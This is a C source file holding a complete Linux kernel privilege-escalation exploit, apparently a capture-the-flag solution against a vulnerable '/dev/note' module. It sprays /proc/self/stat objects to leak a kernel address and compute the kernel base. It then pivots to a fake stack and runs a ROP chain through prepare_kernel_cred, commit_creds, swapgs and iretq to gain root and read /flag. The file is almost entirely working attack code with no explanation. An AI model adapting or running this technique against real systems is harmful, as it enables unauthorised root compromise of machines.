#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>

#define ADD 0xC12ED001
#define DEL 0xC12ED002
#define EDIT 0xC12ED003
#define VIEW 0xC12ED004

typedef struct _Arg{
    unsigned long long size;
    char *buf;
} Arg;

Arg user;
int fd;

unsigned long long user_cs, user_ss, user_eflags, user_sp;

void save_tf()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "pushf;"
        "pop user_eflags;"
    );
}

int add_note(unsigned long long size)
{
    user.size = size;
    return ioctl(fd, ADD, &user);
}

int del_note()
{
    return ioctl(fd, DEL, &user);
}

int edit_note(unsigned long long size, char *buf)
{
    user.size = size;
    user.buf = buf;
    return ioctl(fd, EDIT, &user);
}

int view_note(unsigned long long size, char *buf)
{
    user.size = size;
    user.buf = buf;
    return ioctl(fd, VIEW, &user);
}

void shell()
{
  char flag[0x30] = {0,};
  int fd = open("/flag", 0);
  read(fd, flag, 0x30);
  write(1, flag, 0x30);
}

int main()
{
  save_tf();
  char *laterstack = calloc(1, 0x10000);
  user_sp = laterstack+0x8000;

  fd = open("/dev/note", O_RDWR);

  if (fd<0)
  {
      puts("failed to open ko");
      exit(-1);
  }

  char *tmp = calloc(1, 0x2000);
  char *pay = calloc(1, 0x100);

  memset(pay, 0x41, 0x20);

  for (int i=0; i<6; i++)
  {
    open("/proc/self/stat", O_RDONLY); 	
  }

  add_note(0x20);
  edit_note(0x20, pay);

  open("/proc/self/stat", O_RDONLY);
  int victim = open("/proc/self/stat", O_RDONLY);
  view_note(0x20, tmp);

  unsigned long long leak[4] = {0,};

  memcpy(leak, tmp, 0x20);

  printf("leak[0] : %p\n", leak[0]);
  printf("leak[1] : %p\n", leak[1]);
  printf("leak[2] : %p\n", leak[2]);
  printf("leak[3] : %p\n", leak[3]);

  unsigned long long kbase = leak[0] - 0x13be60;
  printf("[*] kernel base addr : %p\n", kbase);

  unsigned long long xchg = kbase + 0x2ce8f;
  unsigned long long prdi = kbase + 0x22dd4b;//0x11c353;
  unsigned long long mov_rdi_rax = kbase + 0x21f8fc;
  unsigned long long swapgs = kbase + 0x3ef24;
  unsigned long long iretq = kbase + 0x600ae7;
  unsigned long long commit_creds = kbase + 0x69c10;
  unsigned long long prepare_kernel_cred = kbase + 0x69e00;

  printf("[*] xchg addr : %p\n", xchg);
  printf("[*] prepare_kernel_cred : %p\n", prepare_kernel_cred);

  getchar();

  unsigned long long rop[] = {
    prdi,
    0,
    0,
    prepare_kernel_cred,
    mov_rdi_rax,
    0x4141414141414141,
    commit_creds,
    swapgs,
    0x4242424242424242,
    iretq,
    &shell,
    user_cs,
    user_eflags,
    user_sp,
    user_ss
  };

  unsigned long long trigger[] = {
    xchg,
    xchg,
    xchg,
    xchg
  };

  unsigned long long *stack = mmap(xchg&0xfffff000-0x2000, 0x5000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  printf("[*] fake stack : 0x%llx\n", stack);
  memcpy(xchg&0xffffffff, rop, sizeof(rop));

  edit_note(0x20, trigger);
  read(victim, tmp, 1); // trigger

  return 0;
}
